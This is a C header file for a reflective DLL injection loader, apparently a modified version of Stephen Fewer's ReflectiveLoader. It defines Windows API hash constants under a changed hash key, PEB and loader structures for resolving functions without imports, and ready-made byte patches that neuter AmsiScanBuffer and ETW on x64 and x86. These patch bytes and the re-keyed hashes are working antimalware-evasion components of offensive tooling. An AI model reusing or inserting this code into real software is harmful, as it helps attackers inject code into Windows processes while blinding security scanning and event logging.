//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#ifndef _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H
#define _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <Winsock2.h>
#include <intrin.h>

#include "ReflectiveDLLInjection.h"

typedef HMODULE (WINAPI * LOADLIBRARYA)( LPCSTR );
typedef FARPROC (WINAPI * GETPROCADDRESS)( HMODULE, LPCSTR );
typedef LPVOID  (WINAPI * VIRTUALALLOC)( LPVOID, SIZE_T, DWORD, DWORD );
typedef BOOL(WINAPI* VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD(NTAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);
typedef void (WINAPI* OUTPUTDEBUGSTR)(const char*);


/*
* These hashes are valid for HASH_KEY = 13
 
#define KERNEL32DLL_HASH                0x6A4ABC5B
#define NTDLLDLL_HASH                   0x3CFA685D

#define LOADLIBRARYA_HASH               0xEC0E4E8E
#define GETPROCADDRESS_HASH             0x7C0DFCAA
#define VIRTUALALLOC_HASH               0x91AFCA54
#define VIRTUALPROTECT_HASH             0x7946c61b
#define OUTPUTDEBUG_HASH                0x470d22bc
#define NTFLUSHINSTRUCTIONCACHE_HASH    0x534C0AB8
*/

#define KERNEL32DLL_HASH                0xa6154c3a
#define NTDLLDLL_HASH                   0x0521447a

#define LOADLIBRARYA_HASH               0xe0d79feb
#define GETPROCADDRESS_HASH             0x6bac2f89
#define VIRTUALALLOC_HASH               0x9ee2d962
#define VIRTUALPROTECT_HASH             0x9154022f
#define OUTPUTDEBUG_HASH                0x206846d6
#define NTFLUSHINSTRUCTIONCACHE_HASH    0x7353e65d

#define IMAGE_REL_BASED_ARM_MOV32A      5
#define IMAGE_REL_BASED_ARM_MOV32T      7

#define ARM_MOV_MASK                    (DWORD)(0xFBF08000)
#define ARM_MOV_MASK2                   (DWORD)(0xFBF08F00)
#define ARM_MOVW                        0xF2400000
#define ARM_MOVT                        0xF2C00000

#if _WIN32 || _WIN64
#if _WIN64
#define WIN_X64
#else
#define WIN_X86
#endif
#endif

// Check GCC
#if __GNUC__
#if __x86_64__ || __ppc64__
#define WIN_X64
#else
#define WIN_X86
#endif
#endif

#ifdef WIN_X64

// xor rax, rax ; ret
#define ETW_PATCH_BYTES {'\x48', '\x33', '\xc0', '\xc3'}
#define ETW_PATCH_SIZE 4

// mov eax,0x80070057 ; ret
#define AMSISCANBUFFER_PATCH_SIZE 6
#define AMSISCANBUFFER_PATCH_BYTES  {'\xb8','\x57','\x00','\x07','\x80','\xc3'}

#else
#ifdef WIN_X86

// xor eax, eax ; ret
#define ETW_PATCH_BYTES {'\x33', '\xc0', '\xc2', '\x14', '\x00'}
#define ETW_PATCH_SIZE 5

// mov eax,0x80070057 ; ret 0x18
#define AMSISCANBUFFER_PATCH_SIZE 8
#define AMSISCANBUFFER_PATCH_BYTES  {'\xb8','\x57','\x00','\x07','\x80','\xc2', '\x18', '\x00'}

#else WIN_ARM

#error "Patching AMSI, ETW and WDLP on ARM architecture is not supported."

#endif
#endif

#define HASH_KEY                        87

//===============================================================================================//
#pragma intrinsic( _rotr )

__forceinline DWORD ror( DWORD d )
{
    return _rotr( d, HASH_KEY );
}

__forceinline DWORD hash( char * c )
{
    register DWORD h = 0;
    do
    {
        h = ror( h );
        h += *c;
    } while( *++c );

    return h;
}
//===============================================================================================//

// src: 
//   https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/
typedef struct tagHAMSICONTEXT {
  DWORD        Signature;          // "AMSI" or 0x49534D41
  PWCHAR       AppName;            // set by AmsiInitialize
  LPVOID       Antimalware;       // set by AmsiInitialize
  DWORD        SessionCount;       // increased by AmsiOpenSession
} _HAMSICONTEXT, *_PHAMSICONTEXT;


typedef struct _UNICODE_STR
{
  USHORT Length;
  USHORT MaximumLength;
  PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
//__declspec( align(8) ) 
typedef struct _LDR_DATA_TABLE_ENTRY
{
    //LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// WinDbg> dt -v ntdll!_PEB_LDR_DATA
typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
   DWORD dwLength;
   DWORD dwInitialized;
   LPVOID lpSsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
   struct _PEB_FREE_BLOCK * pNext;
   DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct __PEB // 65 elements, 0x210 bytes
{
   BYTE bInheritedAddressSpace;
   BYTE bReadImageFileExecOptions;
   BYTE bBeingDebugged;
   BYTE bSpareBool;
   LPVOID lpMutant;
   LPVOID lpImageBaseAddress;
   PPEB_LDR_DATA pLdr;
   LPVOID lpProcessParameters;
   LPVOID lpSubSystemData;
   LPVOID lpProcessHeap;
   PRTL_CRITICAL_SECTION pFastPebLock;
   LPVOID lpFastPebLockRoutine;
   LPVOID lpFastPebUnlockRoutine;
   DWORD dwEnvironmentUpdateCount;
   LPVOID lpKernelCallbackTable;
   DWORD dwSystemReserved;
   DWORD dwAtlThunkSListPtr32;
   PPEB_FREE_BLOCK pFreeList;
   DWORD dwTlsExpansionCounter;
   LPVOID lpTlsBitmap;
   DWORD dwTlsBitmapBits[2];
   LPVOID lpReadOnlySharedMemoryBase;
   LPVOID lpReadOnlySharedMemoryHeap;
   LPVOID lpReadOnlyStaticServerData;
   LPVOID lpAnsiCodePageData;
   LPVOID lpOemCodePageData;
   LPVOID lpUnicodeCaseTableData;
   DWORD dwNumberOfProcessors;
   DWORD dwNtGlobalFlag;
   LARGE_INTEGER liCriticalSectionTimeout;
   DWORD dwHeapSegmentReserve;
   DWORD dwHeapSegmentCommit;
   DWORD dwHeapDeCommitTotalFreeThreshold;
   DWORD dwHeapDeCommitFreeBlockThreshold;
   DWORD dwNumberOfHeaps;
   DWORD dwMaximumNumberOfHeaps;
   LPVOID lpProcessHeaps;
   LPVOID lpGdiSharedHandleTable;
   LPVOID lpProcessStarterHelper;
   DWORD dwGdiDCAttributeList;
   LPVOID lpLoaderLock;
   DWORD dwOSMajorVersion;
   DWORD dwOSMinorVersion;
   WORD wOSBuildNumber;
   WORD wOSCSDVersion;
   DWORD dwOSPlatformId;
   DWORD dwImageSubsystem;
   DWORD dwImageSubsystemMajorVersion;
   DWORD dwImageSubsystemMinorVersion;
   DWORD dwImageProcessAffinityMask;
   DWORD dwGdiHandleBuffer[34];
   LPVOID lpPostProcessInitRoutine;
   LPVOID lpTlsExpansionBitmap;
   DWORD dwTlsExpansionBitmapBits[32];
   DWORD dwSessionId;
   ULARGE_INTEGER liAppCompatFlags;
   ULARGE_INTEGER liAppCompatFlagsUser;
   LPVOID lppShimData;
   LPVOID lpAppCompatInfo;
   UNICODE_STR usCSDVersion;
   LPVOID lpActivationContextData;
   LPVOID lpProcessAssemblyStorageMap;
   LPVOID lpSystemDefaultActivationContextData;
   LPVOID lpSystemAssemblyStorageMap;
   DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct
{
    WORD    offset:12;
    WORD    type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;
//===============================================================================================//
#endif
//===============================================================================================//
